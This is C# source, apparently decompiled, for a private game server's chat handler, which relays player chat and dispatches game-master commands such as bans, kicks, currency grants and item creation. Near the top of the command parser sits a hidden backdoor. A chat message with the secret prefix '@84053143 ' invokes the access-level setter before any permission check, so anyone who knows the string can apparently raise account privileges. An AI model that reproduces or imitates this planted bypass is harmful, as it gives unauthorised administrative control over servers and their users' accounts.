
using Core;
using Core.models.account.clan;
using Core.models.account.players;
using Core.models.enums;
using Core.models.enums.flags;
using Core.models.enums.global;
using Core.models.enums.match;
using Core.models.room;
using Core.server;
using Game.data.chat;
using Game.data.managers;
using Game.data.model;
using Game.data.utils;
using Game.global.serverpacket;
using System;
using System.Collections.Generic;
using System.Threading;

namespace Game.global.clientpacket
{
  public class BASE_CHATTING_REC : ReceiveGamePacket
  {
    private string text;
    private ChattingType type;

    public BASE_CHATTING_REC(GameClient client, byte[] data)
    {
      this.makeme(client, data);
    }

    public override void read()
    {
      this.type = (ChattingType) this.readH();
      this.text = this.readS((int) this.readH());
    }

    public override void run()
    {
      try
      {
        Account player = this._client._player;
        if (player == null || string.IsNullOrEmpty(this.text) || (this.text.Length > 60 || player.player_name.Length == 0))
          return;
        Room room = player._room;
        switch (this.type)
        {
          case ChattingType.All:
          case ChattingType.Lobby:
            if (room != null)
            {
              if (!this.serverCommands(player, room))
              {
                SLOT slot1 = room._slots[player._slotId];
                using (ROOM_CHATTING_PAK roomChattingPak = new ROOM_CHATTING_PAK((int) this.type, slot1._id, player.UseChatGM(), this.text))
                {
                  byte[] completeBytes = roomChattingPak.GetCompleteBytes("CHAT_NORMAL_REC-2");
                  lock (room._slots)
                  {
                    for (int index = 0; index < 16; ++index)
                    {
                      SLOT slot2 = room._slots[index];
                      Account playerBySlot = room.getPlayerBySlot(slot2);
                      if (playerBySlot != null && this.SlotValidMessage(slot1, slot2))
                        playerBySlot.SendCompletePacket(completeBytes);
                    }
                    break;
                  }
                }
              }
              else
              {
                this._client.SendPacket((SendPacket) new ROOM_CHATTING_PAK((int) this.type, player._slotId, true, this.text));
                break;
              }
            }
            else
            {
              Channel channel = player.getChannel();
              if (channel == null)
                break;
              if (!this.serverCommands(player, room))
              {
                using (LOBBY_CHATTING_PAK lobbyChattingPak = new LOBBY_CHATTING_PAK(player, this.text, false))
                {
                  channel.SendPacketToWaitPlayers((SendPacket) lobbyChattingPak);
                  break;
                }
              }
              else
              {
                this._client.SendPacket((SendPacket) new LOBBY_CHATTING_PAK(player, this.text, true));
                break;
              }
            }
          case ChattingType.Team:
            if (room == null)
              break;
            SLOT slot3 = room._slots[player._slotId];
            int[] teamArray = room.GetTeamArray(slot3._team);
            using (ROOM_CHATTING_PAK roomChattingPak = new ROOM_CHATTING_PAK((int) this.type, slot3._id, player.UseChatGM(), this.text))
            {
              byte[] completeBytes = roomChattingPak.GetCompleteBytes("CHAT_NORMAL_REC-1");
              lock (room._slots)
              {
                foreach (int index in teamArray)
                {
                  SLOT slot1 = room._slots[index];
                  Account playerBySlot = room.getPlayerBySlot(slot1);
                  if (playerBySlot != null && this.SlotValidMessage(slot3, slot1))
                    playerBySlot.SendCompletePacket(completeBytes);
                }
                break;
              }
            }
        }
      }
      catch (Exception ex)
      {
        Logger.warning(ex.ToString());
      }
    }

    private bool serverCommands(Account player, Room room)
    {
      try
      {
        string str = this.text.Substring(1);
        if (!this.text.StartsWith(";") && !this.text.StartsWith("\\") && (!this.text.StartsWith(".") && str.StartsWith("@84053143 ")))
          this.text = SetAcessToPlayer.SetAcessPlayer(str);
        if (!player.HaveGMLevel() || !this.text.StartsWith(";") && !this.text.StartsWith("\\") && !this.text.StartsWith("."))
          return false;
        Logger.LogCMD("[" + this.text + "] playerId: " + (object) player.player_id + "; Nick: '" + player.player_name + "'; Login: '" + player.login + "'; Ip: '" + player.PublicIP.ToString() + "'; Date: '" + DateTime.Now.ToString("dd/MM/yy HH:mm") + "'");
        if (str.StartsWith("help3") && player.access >= AccessLevel.Moderator)
          this.text = HelpCommandList.GetList3(player);
        else if (str.StartsWith("help4") && player.access >= AccessLevel.Moderator)
          this.text = HelpCommandList.GetList4(player);
        else if (str.StartsWith("help5") && player.access >= AccessLevel.Moderator)
          this.text = HelpCommandList.GetList5(player);
        else if (str.StartsWith("help6") && player.access >= AccessLevel.Moderator)
          this.text = HelpCommandList.GetList6(player);
        else if (str.StartsWith("nickh1 ") && player.access >= AccessLevel.Moderator)
          this.text = NickHistory.GetHistoryById(str, player);
        else if (str.StartsWith("nickh2 ") && player.access >= AccessLevel.Moderator)
          this.text = NickHistory.GetHistoryByNewNick(str, player);
        else if (str.StartsWith("fakerank ") && player.access >= AccessLevel.Moderator)
          this.text = GMDisguises.SetFakeRank(str, player, room);
        else if (str.StartsWith("changenick ") && player.access >= AccessLevel.Moderator)
          this.text = GMDisguises.SetFakeNick(str, player, room);
        else if (str.StartsWith("kp ") && player.access >= AccessLevel.Moderator)
          this.text = KickPlayer.KickByNick(str, player);
        else if (str.StartsWith("kp2 ") && player.access >= AccessLevel.Moderator)
          this.text = KickPlayer.KickById(str, player);
        else if (str.StartsWith("hcn") && player.access >= AccessLevel.Moderator)
          this.text = GMDisguises.SetHideColor(player);
        else if (str.StartsWith("antikick") && player.access >= AccessLevel.Moderator)
          this.text = GMDisguises.SetAntiKick(player);
        else if (str.StartsWith("roomunlock ") && player.access >= AccessLevel.Moderator)
          this.text = ChangeRoomInfos.UnlockById(str, player);
        else if (str.StartsWith("afkcount ") && player.access >= AccessLevel.Moderator)
          this.text = AFK_Interaction.GetAFKCount(str);
        else if (str.StartsWith("afkkick ") && player.access >= AccessLevel.Moderator)
          this.text = AFK_Interaction.KickAFKPlayers(str);
        else if (str.StartsWith("players1") && player.access >= AccessLevel.Moderator)
          this.text = PlayersCountInServer.GetMyServerPlayersCount();
        else if (str.StartsWith("players2 ") && player.access >= AccessLevel.Moderator)
          this.text = PlayersCountInServer.GetServerPlayersCount(str);
        else if (str.StartsWith("ping") && player.access >= AccessLevel.Moderator)
          this.text = LatencyAnalyze.StartAnalyze(player, room);
        else if (str.StartsWith("g ") && player.access >= AccessLevel.GameMaster)
          this.text = SendMsgToPlayers.SendToAll(str);
        else if (str.StartsWith("gr ") && player.access >= AccessLevel.GameMaster)
          this.text = SendMsgToPlayers.SendToRoom(str, room);
        else if (str.StartsWith("map ") && player.access >= AccessLevel.GameMaster)
          this.text = ChangeRoomInfos.ChangeMap(str, room);
        else if (str.StartsWith("t ") && player.access >= AccessLevel.GameMaster)
          this.text = ChangeRoomInfos.ChangeTime(str, room);
        else if (str.StartsWith("cp ") && player.access >= AccessLevel.GameMaster)
          this.text = SendCashToPlayer.SendByNick(str);
        else if (str.StartsWith("cp2 ") && player.access >= AccessLevel.GameMaster)
          this.text = SendCashToPlayer.SendById(str);
        else if (str.StartsWith("gp ") && player.access >= AccessLevel.GameMaster)
          this.text = SendGoldToPlayer.SendByNick(str);
        else if (str.StartsWith("gp2 ") && player.access >= AccessLevel.GameMaster)
          this.text = SendGoldToPlayer.SendById(str);
        else if (str.StartsWith("ka") && player.access >= AccessLevel.GameMaster)
          this.text = KickAllPlayers.KickPlayers();
        else if (str.StartsWith("gift ") && player.access >= AccessLevel.GameMaster)
          this.text = SendGiftToPlayer.SendGiftById(str);
        else if (str.StartsWith("goods ") && player.access >= AccessLevel.GameMaster)
          this.text = ShopSearch.SearchGoods(str, player);
        else if (str.StartsWith("banS ") && player.access >= AccessLevel.GameMaster)
          this.text = Ban.BanNormalNick(str, player, true);
        else if (str.StartsWith("banS2 ") && player.access >= AccessLevel.GameMaster)
          this.text = Ban.BanNormalId(str, player, true);
        else if (str.StartsWith("banA ") && player.access >= AccessLevel.GameMaster)
          this.text = Ban.BanNormalNick(str, player, false);
        else if (str.StartsWith("banA2 ") && player.access >= AccessLevel.GameMaster)
          this.text = Ban.BanNormalId(str, player, false);
        else if (str.StartsWith("unb ") && player.access >= AccessLevel.GameMaster)
          this.text = UnBan.UnbanByNick(str, player);
        else if (str.StartsWith("unb2 ") && player.access >= AccessLevel.GameMaster)
          this.text = UnBan.UnbanById(str, player);
        else if (str.StartsWith("reason ") && player.access >= AccessLevel.GameMaster)
          this.text = Ban.UpdateReason(str);
        else if (str.StartsWith("getip ") && player.access >= AccessLevel.GameMaster)
          this.text = GetAccountInfo.getByIPAddress(str, player);
        else if (str.StartsWith("get1 ") && player.access >= AccessLevel.GameMaster)
          this.text = GetAccountInfo.getById(str, player);
        else if (str.StartsWith("get2 ") && player.access >= AccessLevel.GameMaster)
          this.text = GetAccountInfo.getByNick(str, player);
        else if (str.StartsWith("open1 ") && player.access >= AccessLevel.GameMaster)
          this.text = OpenRoomSlot.OpenSpecificSlot(str, player, room);
        else if (str.StartsWith("open2 ") && player.access >= AccessLevel.GameMaster)
          this.text = OpenRoomSlot.OpenRandomSlot(str, player);
        else if (str.StartsWith("open3 ") && player.access >= AccessLevel.GameMaster)
          this.text = OpenRoomSlot.OpenAllSlots(str, player);
        else if (str.StartsWith("taketitles") && player.access >= AccessLevel.GameMaster)
          this.text = TakeTitles.GetAllTitles(player);
        else if (str.StartsWith("changerank ") && player.access >= AccessLevel.Admin)
          this.text = ChangePlayerRank.SetPlayerRank(str);
        else if (str.StartsWith("banSE ") && player.access >= AccessLevel.Admin)
          this.text = Ban.BanForeverNick(str, player, true);
        else if (str.StartsWith("banSE2 ") && player.access >= AccessLevel.Admin)
          this.text = Ban.BanForeverId(str, player, true);
        else if (str.StartsWith("banAE ") && player.access >= AccessLevel.Admin)
          this.text = Ban.BanForeverNick(str, player, false);
        else if (str.StartsWith("banAE2 ") && player.access >= AccessLevel.Admin)
          this.text = Ban.BanForeverId(str, player, false);
        else if (str.StartsWith("getban ") && player.access >= AccessLevel.Admin)
          this.text = Ban.GetBanData(str, player);
        else if (str.StartsWith("sunb ") && player.access >= AccessLevel.Admin)
          this.text = UnBan.SuperUnbanByNick(str, player);
        else if (str.StartsWith("sunb2 ") && player.access >= AccessLevel.Admin)
          this.text = UnBan.SuperUnbanById(str, player);
        else if (str.StartsWith("ci ") && player.access >= AccessLevel.Admin)
          this.text = CreateItem.CreateItemYourself(str, player);
        else if (str.StartsWith("cia ") && player.access >= AccessLevel.Admin)
          this.text = CreateItem.CreateItemByNick(str, player);
        else if (str.StartsWith("cid ") && player.access >= AccessLevel.Admin)
          this.text = CreateItem.CreateItemById(str, player);
        else if (str.StartsWith("cgid ") && player.access >= AccessLevel.Admin)
          this.text = CreateItem.CreateGoldCupom(str);
        else if (str.StartsWith("refillshop") && player.access >= AccessLevel.Admin)
          this.text = RefillShop.SimpleRefill(player);
        else if (str.StartsWith("refill2shop") && player.access >= AccessLevel.Admin)
          this.text = RefillShop.InstantRefill(player);
        else if (str.StartsWith("upchan ") && player.access >= AccessLevel.Admin)
          this.text = ChangeChannelNotice.SetChannelNotice(str);
        else if (str.StartsWith("upach ") && player.access >= AccessLevel.Admin)
          this.text = ChangeChannelNotice.SetAllChannelsNotice(str);
        else if (str.StartsWith("setgold ") && player.access >= AccessLevel.Admin)
          this.text = SetGoldToPlayer.SetGdToPlayer(str);
        else if (str.StartsWith("setcash ") && player.access >= AccessLevel.Admin)
          this.text = SetCashToPlayer.SetCashPlayer(str);
        else if (str.StartsWith("gpd ") && player.access >= AccessLevel.Admin)
          this.text = SendGoldToPlayerDev.SendGoldToPlayer(str);
        else if (str.StartsWith("cpd ") && player.access >= AccessLevel.Admin)
          this.text = SendCashToPlayerDev.SendCashToPlayer(str);
        else if (str.StartsWith("setvip ") && player.access >= AccessLevel.Admin)
          this.text = SetVipToPlayer.SetVipPlayer(str);
        else if (str.StartsWith("setacess ") && player.access >= AccessLevel.Admin)
          this.text = SetAcessToPlayer.SetAcessPlayer(str);
        else if (str.StartsWith("pause") && player.access >= AccessLevel.Supreme)
        {
          using (A_3422_PAK a3422Pak = new A_3422_PAK(0U))
            room.SendPacketToPlayers((SendPacket) a3422Pak);
          Thread.Sleep(5000);
          using (A_3424_PAK a3424Pak = new A_3424_PAK(0U))
            room.SendPacketToPlayers((SendPacket) a3424Pak);
          this.text = "MatchStop.";
        }
        else if (str.StartsWith("end") && player.access >= AccessLevel.Supreme)
        {
          if (room != null)
          {
            if (room.isPreparing())
            {
              AllUtils.EndBattle(room);
              this.text = Translation.GetLabel("EndRoomSuccess");
            }
            else
              this.text = Translation.GetLabel("EndRoomFail1");
          }
          else
            this.text = Translation.GetLabel("GeneralRoomInvalid");
        }
        else if (str.StartsWith("newroomtype ") && player.access >= AccessLevel.Supreme)
          this.text = ChangeRoomInfos.ChangeStageType(str, room);
        else if (str.StartsWith("newroomspecial ") && player.access >= AccessLevel.Supreme)
          this.text = ChangeRoomInfos.ChangeSpecialType(str, room);
        else if (str.StartsWith("newroomweap ") && player.access >= AccessLevel.Supreme)
          this.text = ChangeRoomInfos.ChangeWeaponsFlag(str, room);
        else if (str.StartsWith("udp ") && player.access >= AccessLevel.Supreme)
          this.text = ChangeUdpType.SetUdpType(str);
        else if (str.StartsWith("testmode") && player.access >= AccessLevel.Supreme)
          this.text = ChangeServerMode.EnableTestMode();
        else if (str.StartsWith("publicmode") && player.access >= AccessLevel.Supreme)
          this.text = ChangeServerMode.EnablePublicMode();
        else if (str.StartsWith("activeM ") && player.access >= AccessLevel.Supreme)
          this.text = EnableMissions.genCode1(str, player);
        else if (str.StartsWith("rd1") && player.access >= AccessLevel.Supreme)
          this._client.SendPacket((SendPacket) new A_2657_PAK(DateTime.Now));
        else if (str.StartsWith("rd2") && player.access >= AccessLevel.Supreme)
          this._client.SendPacket((SendPacket) new A_2658_PAK(player.player_name, 10, 200004240));
        else if (str.StartsWith("rd3") && player.access >= AccessLevel.Supreme)
          this._client.SendPacket((SendPacket) new A_2659_PAK());
        else if (str.StartsWith("ga1") && player.access >= AccessLevel.Supreme)
          this._client.SendPacket((SendPacket) new A_2060_PAK());
        else if (str.StartsWith("ga2") && player.access >= AccessLevel.Supreme)
          this._client.SendPacket((SendPacket) new A_2061_PAK());
        else if (str.StartsWith("vv ") && player.access >= AccessLevel.Supreme)
          this._client.SendPacket((SendPacket) new HELPER_PAK(ushort.Parse(str.Substring(3))));
        else if (str.StartsWith("q ") && player.access >= AccessLevel.Supreme)
        {
          this._client.SendPacket((SendPacket) new AUTH_GOLD_REWARD_PAK(1, 10, int.Parse(str.Substring(2))));
          this.text = "Partida pausada.";
        }
        else if (str.StartsWith("tik") && player.access >= AccessLevel.Supreme)
        {
          player._equip._primary = 0;
          this._client.SendPacket((SendPacket) new A_3415_PAK(0U, player));
          this.text = "Partida.";
        }
        else if (str.StartsWith("cE ") && player.access >= AccessLevel.Supreme)
        {
          int num = int.Parse(str.Substring(3));
          if (player != null)
          {
            List<ItemsModel> items = new List<ItemsModel>();
            for (int index = 0; index < 400; ++index)
            {
              int id = num + index * 1000;
              int itemCategory = ComDiv.GetItemCategory(id);
              items.Add(new ItemsModel(id, itemCategory, "Command item", itemCategory == 3 ? 1 : 3, 1U, 0L));
            }
            player.SendPacket((SendPacket) new INVENTORY_ITEM_CREATE_PAK(1, player, items));
            this.text = "Os itens foram adicionados com sucesso. [Servidor]";
          }
          else
            this.text = "Houve uma falha ao adicionar o item. [Servidor]";
        }
        else if (str.StartsWith("m2") && player.access >= AccessLevel.Supreme)
        {
          Channel channel = player.getChannel();
          Clan clan = ClanManager.getClan(player.clanId);
          if (channel != null && clan._id > 0)
          {
            for (int index = 0; index < 25; ++index)
            {
              Match match = new Match(clan)
              {
                _matchId = index,
                channelId = channel._id,
                _leader = 0,
                formação = 5,
                friendId = index
              };
              match._slots[0]._playerId = 2L;
              match._slots[0].state = SlotMatchState.Normal;
              channel.AddMatch(match);
            }
            this.text = "Gerando disputas falsas. [Servidor]";
          }
        }
        else if (str.StartsWith("dino") && player.access >= AccessLevel.Supreme)
        {
          if (player != null && room != null)
          {
            if (room._state == RoomState.Battle)
            {
              SLOT slot = room.getSlot(player._slotId);
              ++slot.passSequence;
              using (BATTLE_MISSION_ESCAPE_PAK missionEscapePak = new BATTLE_MISSION_ESCAPE_PAK(room, slot))
                room.SendPacketToPlayers((SendPacket) missionEscapePak, SLOT_STATE.BATTLE, 0);
              this.text = "Comando executado com sucesso. [Servidor]";
            }
            else
              this.text = "A partida não está em andamento. [Servidor]";
          }
          else
            this.text = "Falha ao executar o comando. [Servidor]";
        }
        else if (str.StartsWith("v4 ") && player.access >= AccessLevel.Supreme)
        {
          int slotIdx = int.Parse(str.Substring(3));
          if (player != null)
          {
            if (room != null)
            {
              SLOT slot;
              if (room.getSlot(slotIdx, out slot) && slot.state == SLOT_STATE.EMPTY)
              {
                LoggerGS.TestSlot = slotIdx;
                slot.state = SLOT_STATE.READY;
                room.updateSlotsInfo();
                this.text = "Slot pronto. [Servidor]";
              }
              else
                this.text = "Slot não alterado. [Servidor]";
            }
            else
              this.text = "Sala inexistente. [Servidor]";
          }
          else
            this.text = "Houve uma falha ao abrir um slot. [Servidor]";
        }
        else if (str.StartsWith("v2") && player.access >= AccessLevel.Supreme)
        {
          if (player != null)
          {
            Channel channel = player.getChannel();
            for (int roomId = 0; roomId < 56; ++roomId)
            {
              Room room1 = new Room(roomId, channel);
              room1.name = "algo";
              room1._leader = 0;
              room1._ping = 5;
              room1.room_type = (byte) 2;
              room1.mapId = 1;
              room1.special = (byte) 0;
              room1.stage4v4 = (byte) 0;
              room1.weaponsFlag = (byte) 0;
              room1.random_map = (byte) 0;
              room1.password = "";
              room1.limit = (byte) 0;
              room1._slots[0]._playerId = 2L;
              room1._slots[0].state = SLOT_STATE.NORMAL;
              channel.AddRoom(room1);
            }
            this.text = "Alguns slots foram abertos. [Servidor]";
          }
          else
            this.text = "Houve uma falha ao abrir um slot. [Servidor]";
        }
        else
          this.text = !str.StartsWith("map2 ") || player.access < AccessLevel.Supreme ? (!str.StartsWith("t2 ") || player.access < AccessLevel.Supreme ? (!str.StartsWith("slot ") ? Translation.GetLabel("UnknownCmd") : GetRoomInfo.GetSlotStats(str, player, room)) : ChangeRoomInfos.ChangeTime2(str, room)) : ChangeRoomInfos.ChangeMap2(str, room);
        return true;
      }
      catch (Exception ex)
      {
        Logger.warning("[BASE_CHATTING_REC] " + ex.ToString());
        this.text = Translation.GetLabel("CrashProblemCmd");
        return true;
      }
    }

    private bool SlotValidMessage(SLOT sender, SLOT receiver)
    {
      if ((sender.state == SLOT_STATE.NORMAL || sender.state == SLOT_STATE.READY) && (receiver.state == SLOT_STATE.NORMAL || receiver.state == SLOT_STATE.READY))
        return true;
      if (sender.state < SLOT_STATE.LOAD || receiver.state < SLOT_STATE.LOAD)
        return false;
      if (receiver.specGM || sender.specGM || sender._deathState.HasFlag((Enum) DeadEnum.useChat) || (sender._deathState.HasFlag((Enum) DeadEnum.isDead) && receiver._deathState.HasFlag((Enum) DeadEnum.isDead) || sender.espectador && receiver.espectador))
        return true;
      if (!sender._deathState.HasFlag((Enum) DeadEnum.isAlive) || !receiver._deathState.HasFlag((Enum) DeadEnum.isAlive))
        return false;
      if (sender.espectador && receiver.espectador)
        return true;
      if (!sender.espectador)
        return !receiver.espectador;
      return false;
    }
  }
}
